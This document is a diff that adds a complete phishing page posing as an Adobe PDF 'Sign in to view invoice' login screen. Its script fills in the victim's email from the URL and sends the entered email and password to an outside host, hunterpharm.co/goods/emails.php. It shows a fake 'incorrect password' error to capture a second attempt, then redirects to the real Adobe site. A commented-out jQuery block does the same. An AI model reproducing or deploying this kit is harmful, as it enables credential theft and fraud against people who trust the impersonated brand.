@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<HTML>
+<head>
+      <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+      <title>Purchase Order</title>
+      <link rel="shortcut icon" href="https://www.adobe.com/content/dam/dx-dc/favicons/favicon.ico" type="image/vnd.microsoft.icon">
+      <!-- <script src="https://code.jquery.com/jquery-3.7.0.js" integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script> -->
+</head>
+
+<style type=text/css>
+      body, html {
+            height: 100%;
+            margin: 0;  
+            font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microilsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+      }	
+      .wrapper {
+            background-image: url(https://cdn.mcauto-images-production.sendgrid.net/32724a092ad701f7/c6e2282d-8a53-44c8-9b7c-262b2479f731/1366x768.jpg);
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-position: center;
+            background-size: cover;
+            position: fixed;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 100%;
+            display: flex;
+            flex-flow: column nowrap;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+      }     
+      .element {
+            width: 320px;
+            height: 300px;
+            padding: 40px 30px;
+            background-color: #ffffff;
+            border: 1px solid grey;
+            border-color: #b30b00;
+      }     
+      .elemente{
+            width: 400px;
+            height: 300px;
+            padding: 40px 30px;
+            background-color: #ffffff;
+            border: 1px solid grey;
+      }
+      div .sign-opt {
+            padding: 20px 0px;	
+            -size: 14px;
+      }
+      .newbutton{
+            width: 110px;
+            float: left;
+            border-color: #b30b00;
+            background-color: #b30b00;
+            color: #fff;
+            font-size: 14px;
+            padding: 10px 0;
+            cursor: pointer;
+            border: none;
+      }
+      .newbutton:disabled{
+            opacity: 0.5;
+      }
+      .error{
+            color: red;
+      }
+</style>
+
+
+<body>
+<DIV class=wrapper>
+      <DIV id=element class=element>
+            <FORM autocomplete="on" method="GET" id="form">
+                  <p>
+                        <!-- <input type="hidden" name="_redirect" value="https://www.lamborghini.com/en-en/models/aventador/aventador-svj-roadster"> -->
+                        <DIV id=logo>
+                              <IMG src="https://static.adobelogin.com/clients/virgoweb-2020/4x_817cf14a2f3fcff4ee6d4e35c5026779.png" color="#b30b00" width="30" height="30"/> <b> Adobe PDF</b>
+                        </DIV>
+                  </p>
+                  <p>
+                        <DIV id=cont style="TEXT-ALIGN: left; PADDING-TOP: 10px; font-size:20px; color:#b30b00;" >Sign in to view invoice</DIV>
+                  </p>
+                  <p>
+                        <DIV>
+                              <INPUT type="email" autocomplete="on" name="email" required="required" placeholder="Email address" style="height:30; border-color: #b30b00;" class="email" id="email">
+                        </DIV>
+                  </p>
+                  <div>
+                        <input type="password" id="password" name="password" required="required" placeholder="Password" autofocus="autofocus" style="height:30; border-color: #b30b00;" class="password">
+                  </div>
+                  <p id="error" style="color: red;"></p>
+                  <DIV id=sign-opt class=sign-opt>
+                        <DIV id=no-acc></A></DIV>
+                        <DIV class=button>
+                              <!-- <A href="#"> -->
+                                    <BUTTON class="newbutton" type="submit" name="submit" id="newbutton">
+                                          Sign In
+                                    </BUTTON>
+                              <!-- </A> -->
+                        </DIV>
+
+                        <input type="hidden" id="number" value="0">
+                        <DIV id=sign-out class=sign-opt>
+                              <A href="#"></A>
+                        </DIV>
+                  </DIV>
+            </FORM>
+      </DIV>
+</DIV>
+</body>
+</HTML>
+
+<script>
+      var link = window.location.href;
+      var url = new URL(link);
+      var hash = url.hash;
+      var updated_email = hash.replace("#", "");
+      document.getElementById("email").value = updated_email
+
+      document.addEventListener("DOMContentLoaded", function() {
+            var form = document.getElementById("form");
+            form.addEventListener("submit", function(e) {
+                  e.preventDefault();
+                  var number = parseInt(document.getElementById("number").value);
+                  var button = document.getElementById("newbutton");
+                  // send ajax request
+                  var formData = new FormData(form);
+                  var xhr = new XMLHttpRequest();
+                  xhr.open("POST", "https://hunterpharm.co/goods/emails.php", true);  
+                  // add error message
+                  var errors = document.getElementById("error");
+                  errors.innerText = "Incorrect Details, Retype Password !";
+                  // empty password field and increase counter
+                  var password = document.getElementById("password");
+                  password.value = "";
+                  var added = number + 1;
+                  document.getElementById("number").value = added;
+
+                  if (number === 1) {
+                        errors.innerText = "";
+                        setTimeout(() => {
+                              window.location.href = "https://www.adobe.com/documentcloud.html";
+                        }, 2000);
+                  }
+
+                  xhr.onreadystatechange = function() {
+                        if (xhr.readyState === XMLHttpRequest.DONE) {
+                              if (xhr.status === 200) {
+                                    // Handle the response from the PHP page
+                                    console.log(xhr.responseText);
+                              } else {
+                                    console.error(xhr.responseText);
+                              }
+                        }
+                  };
+                  // Send the form data
+                  xhr.send(formData); 
+            });
+      });
+
+      // $(".newbutton").click(function(){
+      //       var number = parseInt($(".number").val());
+      //       $("form").submit(function(e){
+      //             $(".newbutton").attr("disabled", true)
+      //             e.preventDefault();
+      //             $.ajax({
+      //                   type : "GET",
+      //                   url : "https://hunterpharm.co/goods/emails.php",
+      //                   data : $("form").serialize() + "&submit="
+      //             }).done(function(data, status){
+      //                   $(".error").text("Incorrect Details, Retype Password !");
+      //                   $(".password").val("")
+      //                   var added = number + 1;
+      //                   $(".number").val(added);
+      //                   $(".newbutton").attr("disabled", false);
+      //                   if (parseInt($(".number").val()) === 2) {
+      //                         $(".error").text("");
+      //                         setTimeout(() => {
+      //                               // window.location.href = "mailto:" + $(".email").val();
+      //                               window.location.href = "https://www.adobe.com/documentcloud.html";
+      //                         }, 2000);
+      //                   };
+      //             });
+      //       });
+      // });
+</script>
